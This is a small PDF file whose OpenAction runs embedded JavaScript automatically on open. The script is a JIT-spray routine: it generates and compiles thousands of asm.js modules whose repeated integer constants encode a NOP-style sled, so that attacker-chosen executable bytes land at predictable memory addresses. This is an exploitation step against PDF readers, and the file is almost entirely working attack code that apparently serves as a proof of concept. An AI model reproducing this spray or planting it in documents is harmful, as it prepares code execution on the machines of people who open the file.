%PDF 
1 0 obj
<</Pages 1 0 R /OpenAction 2 0 R>> 
2 0 obj
<</S /JavaScript /JS (
var sprayArr = [];

// store sprayed asm.js modules

var asmJsModulesArr = [];

function sprayJITShellcode(asmJsModuleName, payloadFuncName,ffix) {
	var kz = {};
	kz[ffix] = function  (){
		var val =0;
		val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8b99090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0x19b447a2)|0;
		return val|0;
}
	
	var script = ''+
	
	'function ' + asmJsModuleName + '(stdlib,heap){'+
		'"use asm";'+
		'function ' + payloadFuncName + '() {'+
			'var val = 0;'+
			'val = ' + kz[ffix] + '();'+
			'return val|0;'+
		'}'+
		'return '  + payloadFuncName + ';'+
	'}'+
	
	

	'for (var f=0; f<0x10; f++) {'+
		'asmJsModulesArr.push(' + asmJsModuleName + '(this,0)); '+
	'}'+
	'';
	
	//app.alert(util.printf(script));
	eval(script);
	asmJsModulesArr[asmJsModulesArr.length - 1]();

}

for (var jitCount = 0; jitCount < 0x4800; jitCount++) {
  sprayJITShellcode("foo"+jitCount,"payload"+jitCount,"ffi_func"+jitCount);
}
app.alert(util.printf("done"));

)>> trailer <</Root 1 0 R>>
